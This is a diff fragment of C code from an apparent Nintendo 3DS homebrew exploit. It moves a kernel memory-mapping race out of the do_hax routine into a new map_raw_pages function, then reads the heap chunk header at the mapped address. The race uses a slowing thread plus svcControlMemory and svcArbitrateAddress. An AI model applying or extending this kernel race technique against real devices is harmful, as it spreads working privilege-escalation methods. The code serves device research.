@@ -26,13 +26,8 @@ void allocate_thread(void* arg) {
     control_res = svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
-// Executes exploit.
-void do_hax() {
-    // Prepare necessary info.
-    memAddr = __ctru_heap + __ctru_heap_size;
-    memSize = PAGE_SIZE * 2;
-
-    // Retrieve the address arbiter.
+// Maps pages with chunk headers present.
+void map_raw_pages(u32 memAddr, u32 memSize) {
     Handle arbiter = __sync_get_arbiter();
 
     // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
@@ -42,6 +37,16 @@ void do_hax() {
 
     // Use svcArbitrateAddress to detect when the memory page has been mapped.
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
+}
+
+// Executes exploit.
+void do_hax() {
+    // Prepare necessary info.
+    memAddr = __ctru_heap + __ctru_heap_size;
+    memSize = PAGE_SIZE * 2;
+
+    // Map the pages.
+    map_raw_pages(memAddr, memSize);
 
     // Retrieve the current header data.
     u32 size = *(vu32*) (memAddr);
